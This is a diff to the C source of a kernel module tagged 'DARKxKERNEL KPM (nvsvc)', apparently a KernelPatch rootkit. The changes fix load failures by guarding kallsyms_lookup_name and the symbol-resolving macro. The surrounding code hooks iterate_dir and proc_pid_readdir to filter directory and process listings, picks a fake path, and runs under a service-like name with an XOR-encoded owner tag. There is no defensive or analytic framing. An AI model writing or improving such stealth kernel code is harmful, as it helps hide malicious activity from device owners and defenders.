@@ -2,13 +2,14 @@
 //  DARKxKERNEL KPM  (nvsvc)  v11  LOAD-SAFE
 //  Owner tag: XOR-encoded + checksum-locked
 //  Kernel 3.18 - 7.x (arm64 / x86_64)
-//  v11: load-fail fixes -- kallsyms truncation, E2BIG, hook_tr
-//       clobber, non-fatal version/misc/hook gates, open slot
+//  v11: load-fail fixes -- kretprobe E2BIG, hook_tr clobber,
+//       non-fatal version/misc/hook gates, open slot, kallsyms include
 // ============================================================
 #include <ktypes.h>
 #include <compiler.h>
 #include <stdbool.h>
 #include <common.h>
+#include <kallsyms.h>
 #include <kpmodule.h>
 #include <hook.h>
 #include <linux/printk.h>
@@ -28,10 +29,9 @@
 #  endif
 #endif
 
-/* ALWAYS declare: kputils.h mil jaye to bhi ye safe hai.
- * Warna implicit-int declaration kernel address ko 32-bit me kaat deti hai
- * aur misc_register/hook_wrap4 ko garbage address milta hai -> load fail. */
-extern unsigned long kallsyms_lookup_name(const char *name);
+/* kallsyms_lookup_name KP me function-pointer VARIABLE hai (kallsyms.h),
+ * isliye khud extern declare nahi karna -- warna redeclare error deta hai.
+ * Sirf current_uid ko guard karna hai jab kputils.h na mile. */
 #ifndef KP_HAVE_UTILS
 extern unsigned int current_uid(void);
 #endif
@@ -416,6 +416,7 @@ static int register_kprobe(struct kprobe *p)
 {
 	unsigned long addr;
 	if (!p->symbol_name) return -EINVAL;
+	if (!kallsyms_lookup_name) return -ESRCH;
 	addr = kallsyms_lookup_name(p->symbol_name);
 	if (!addr) { pr_info("nvsvc: no sym %s\n", p->symbol_name); return -ESRCH; }
 	p->addr = (void *)addr;
@@ -436,6 +437,7 @@ static int register_kretprobe(struct kretprobe *kr)
 	unsigned long addr;
 	if (!kr->kp.symbol_name) return -EINVAL;
 	if (kr->data_size > KRET_BODY_MAX) return -E2BIG;
+	if (!kallsyms_lookup_name) return -ESRCH;
 	addr = kallsyms_lookup_name(kr->kp.symbol_name);
 	if (!addr) { pr_info("nvsvc: no sym %s\n", kr->kp.symbol_name); return -ESRCH; }
 	kr->kp.addr = (void *)addr;
@@ -1086,14 +1088,14 @@ static void hooks_install(void)
 #endif
 
 #if STAGE >= 5
-	iterate_addr = kallsyms_lookup_name("iterate_dir");
+	iterate_addr = kallsyms_lookup_name ? kallsyms_lookup_name("iterate_dir") : 0;
 	if (iterate_addr &&
 	    !hook_wrap4((void *)iterate_addr, dir_before, dir_after, (void *)0))
 		hooks_ok++;
 	else
 		iterate_addr = 0;
 
-	piddir_addr = kallsyms_lookup_name("proc_pid_readdir");
+	piddir_addr = kallsyms_lookup_name ? kallsyms_lookup_name("proc_pid_readdir") : 0;
 	if (piddir_addr &&
 	    !hook_wrap4((void *)piddir_addr, dir_before, dir_after, (void *)1))
 		hooks_ok++;
@@ -1154,7 +1156,8 @@ static void pick_fake_path(void)
 }
 
 /* ---------- symbols ---------- */
-#define RS(name, slot) do { *(void **)&(slot) = (void *)kallsyms_lookup_name(name); \
+#define RS(name, slot) do { *(void **)&(slot) = kallsyms_lookup_name ? \
+	(void *)kallsyms_lookup_name(name) : 0; \
 	if (!(slot)) pr_info("nvsvc: missing %s\n", name); } while (0)
 
 static int resolve_syms(void)
